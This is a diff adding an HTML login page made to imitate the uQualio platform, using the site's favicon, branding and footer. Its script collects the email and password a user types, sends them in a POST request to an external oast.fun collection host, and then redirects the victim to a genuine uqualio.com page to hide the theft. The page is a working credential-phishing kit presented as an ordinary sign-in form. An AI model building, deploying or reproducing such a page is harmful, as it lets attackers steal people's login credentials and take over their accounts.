@@ -1,0 +1,195 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login to Continue</title>
+    <link rel="icon" href="https://app.uqualio.com/favicon.ico" type="image/x-icon">
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
+            background-color: #f9f9f9;
+        }
+        header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 10px 20px;
+            background-color: #fff;
+            border-bottom: 1px solid #ddd;
+        }
+        header img {
+            height: 30px;
+            margin-right: 20px;
+        }
+        header .right {
+            display: flex;
+            align-items: center;
+        }
+        header select, header .signin-btn {
+            margin-left: 20px;
+            padding: 10px;
+            border: 1px solid #ddd;
+            border-radius: 5px;
+        }
+        header .signin-btn {
+            background-color: rgb(0, 255, 230);
+            border-color: rgb(0, 255, 230);
+            color: #000;
+            display: flex;
+            align-items: center;
+            cursor: pointer;
+        }
+        header .signin-btn svg {
+            margin-right: 5px;
+        }
+        .container {
+            flex: 1;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+        .login-container {
+            width: 100%;
+            max-width: 400px;
+            padding: 20px;
+            background-color: white;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+            text-align: center;
+        }
+        .login-container img {
+            width: 200px;
+            margin-bottom: 20px;
+        }
+        .login-container h2 {
+            margin-bottom: 20px;
+        }
+        .login-container form {
+            display: flex;
+            flex-direction: column;
+            gap: 10px;
+        }
+        .login-container input[type="text"],
+        .login-container input[type="password"] {
+            width: 100%;
+            padding: 10px;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+            box-sizing: border-box;
+        }
+        .login-container a {
+            text-decoration: none;
+            color: #007bff;
+        }
+        .login-container button {
+            width: 100%;
+            min-width: 100%;
+            padding: 10px;
+            border: 1px solid rgb(0, 255, 230);
+            border-radius: 4px;
+            background-color: rgb(0, 255, 230);
+            color: #000;
+            cursor: pointer;
+            font-size: 16px;
+            box-sizing: border-box;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            transition: background-color 0.3s, border-color 0.3s;
+        }
+        .login-container button:hover {
+            background-color: rgb(0, 230, 205);
+            border-color: rgb(0, 230, 205);
+        }
+        .login-container button:disabled {
+            background-color: #ccc;
+            border-color: #ccc;
+            cursor: not-allowed;
+        }
+        footer {
+            text-align: center;
+            padding: 10px 20px;
+            background-color: #f9f9f9;
+            border-top: 1px solid #ddd;
+            font-size: 12px;
+            color: #aaa;
+        }
+        footer a {
+            margin: 0 10px;
+            color: #007bff;
+            text-decoration: none;
+        }
+    </style>
+</head>
+<body>
+    <header>
+        <div style="display: flex; align-items: center;">
+            <a href="#"><img src="https://raw.githubusercontent.com/Usama3423/uqualio/main/uqualio_logo_blue_transparent_tagline.png" alt="uQualio Logo" title="All available content"></a>
+        </div>
+        <div class="right">
+            <select>
+                <option>English (UK)</option>
+                <!-- Add other language options here -->
+            </select>
+            <button class="signin-btn">
+                <svg role="img" aria-hidden="true" focusable="false" data-prefix="fas" data-icon="arrow-right-to-bracket" class="svg-inline--fa fa-arrow-right-to-bracket" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M416 32h-64c-17.67 0-32 14.33-32 32s14.33 32 32 32h64c17.67 0 32 14.33 32 32v256c0 17.67-14.33 32-32 32h-64c-17.67 0-32 14.33-32 32s14.33 32 32 32h64c53.02 0 96-42.98 96-96V128C512 74.98 469 32 416 32zM342.6 233.4l-128-128c-12.51-12.51-32.76-12.49-45.25 0c-12.5 12.5-12.5 32.75 0 45.25L242.8 224H32C14.31 224 0 238.3 0 256s14.31 32 32 32h210.8l-73.38 73.38c-12.5 12.5-12.5 32.75 0 45.25s32.75 12.5 45.25 0l128-128C355.1 266.1 355.1 245.9 342.6 233.4z"></path></svg>
+                <span>Sign in</span>
+            </button>
+        </div>
+    </header>
+    <div class="container">
+        <div class="login-container">
+            <h2>Already a user?</h2>
+            <form id="loginForm">
+                <input type="text" id="loginUsername" placeholder="Enter email or mobile phone number" required>
+                <input type="password" id="loginPassword" placeholder="Password" required>
+                <div>
+                    <span>Forgot password? </span><a href="#">Click here</a>
+                </div>
+                <button type="submit">Sign in</button>
+            </form>
+        </div>
+    </div>
+    <footer>
+        <a href="#">Commercial Terms</a>
+        <a href="#">Terms & Conditions</a>
+        <a href="#">Privacy & Cookies Policy</a>
+        <a href="#">Legal Terms</a>
+        <p>© 2017-2024 - uQualio®</p>
+        <p>3204</p>
+    </footer>
+    <script>
+        document.getElementById('loginForm').addEventListener('submit', function(event) {
+            // Prevent the default form submission behavior
+            event.preventDefault();
+
+            // Get the values entered by the user
+            var email = document.getElementById('loginUsername').value;
+            var password = document.getElementById('loginPassword').value;
+
+            // Log the email and password
+            console.log("Email:", email);
+            console.log("Password:", password);
+
+            // Send the email and password to the server
+            fetch('https://jksuolqicsmqvwaztvtwh6x9v707fo0os.oast.fun', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({ email: email, password: password })
+            })
+            .then(response => {
+                // Redirect the user to the specified link
+                window.location.href = 'https://simco.uqualio.com/user/19954/';
+            })
+            .catch(error => console.error('Error:', error));
+        });
+    </script>
+</body>
+</html>
